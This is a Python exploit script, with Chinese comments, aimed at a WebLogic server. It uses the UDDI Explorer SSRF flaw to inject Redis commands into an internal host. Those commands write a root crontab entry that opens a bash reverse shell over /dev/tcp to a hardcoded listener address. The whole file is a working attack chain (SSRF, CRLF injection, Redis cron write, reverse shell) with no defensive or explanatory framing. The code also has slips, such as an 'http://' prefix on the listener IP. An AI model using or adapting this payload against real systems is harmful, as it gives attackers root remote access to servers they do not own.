import socket
import requests,socket

listen_ip = 'http://192.168.150.131' # 反弹shell 监听ip
listen_port = 7777 # 反弹shell 监听端口
mubiao_ip = '192.168.150.131' # 目标ip
mubiao_port = 7001 # 目标端口

def poc(url):
    url = socket.gethostbyname(url) # 将url 转换成ip
    ip = url.split(':')[0] 
    port = int(url.split(':')[-1]) if ':' in url else 6379 # 判断是否有端口，无端口就是6379
    try:
        payload = r'?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0'}

        # 访问链接
        step1 = '{}:{}/uddiexplorer/SearchPublicRegistries.jsp{}{}:{}/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa'.format(mubiao_ip,str(mubiao_port),payload,ip,str(port),listen_ip,str(listen_port))
        print('step1: {}'.format(step1))
        res = requests.get(url=step1,headers=headers)
        #print(res.text)
    except Exception as e:
        # print e
        return False
    return False

poc("172.24.0.2") # 存活6379ip地址